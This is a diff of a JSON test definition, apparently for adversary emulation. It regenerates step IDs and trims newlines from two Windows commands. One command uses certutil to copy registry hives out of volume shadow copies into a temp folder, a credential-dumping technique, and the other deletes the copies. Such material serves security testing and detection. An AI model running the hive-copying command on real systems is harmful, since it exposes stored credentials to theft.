@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "a6c003e3-f5b2-44c4-801a-64541ae1a72b",
+      "id": "e5b941c7-49e3-475e-ad83-e7e3e3979c73",
       "type": "execute-command",
       "data": {
-        "command": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 \u003enul 2\u003e\u00261) \u0026 dir /B %temp%\\#{target_hive}vss*\n",
+        "command": "for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\#{target_hive}\" %temp%\\#{target_hive}vss%a 2 \u003enul 2\u003e\u00261) \u0026 dir /B %temp%\\#{target_hive}vss*",
         "command_type": "command_prompt"
       },
       "elevation_required": false
     },
     {
-      "id": "17f6bdeb-0335-46ed-8c2b-a2b75d47b4d1",
+      "id": "ebcb1729-a5dc-4589-9797-11fd6c3ec0f8",
       "type": "execute-command",
       "data": {
-        "command": "for /L %a in (1,1,#{limit}) do @(del %temp%\\#{target_hive}vss%a \u003enul 2\u003e\u00261)\n",
+        "command": "for /L %a in (1,1,#{limit}) do @(del %temp%\\#{target_hive}vss%a \u003enul 2\u003e\u00261)",
         "command_type": "command_prompt"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "a6c003e3-f5b2-44c4-801a-64541ae1a72b",
+      "s": "e5b941c7-49e3-475e-ad83-e7e3e3979c73",
       "p": "on-success",
-      "o": "17f6bdeb-0335-46ed-8c2b-a2b75d47b4d1"
+      "o": "ebcb1729-a5dc-4589-9797-11fd6c3ec0f8"
     },
     {
-      "s": "a6c003e3-f5b2-44c4-801a-64541ae1a72b",
+      "s": "e5b941c7-49e3-475e-ad83-e7e3e3979c73",
       "p": "on-failure",
-      "o": "17f6bdeb-0335-46ed-8c2b-a2b75d47b4d1"
+      "o": "ebcb1729-a5dc-4589-9797-11fd6c3ec0f8"
     }
   ],
   "tags": [
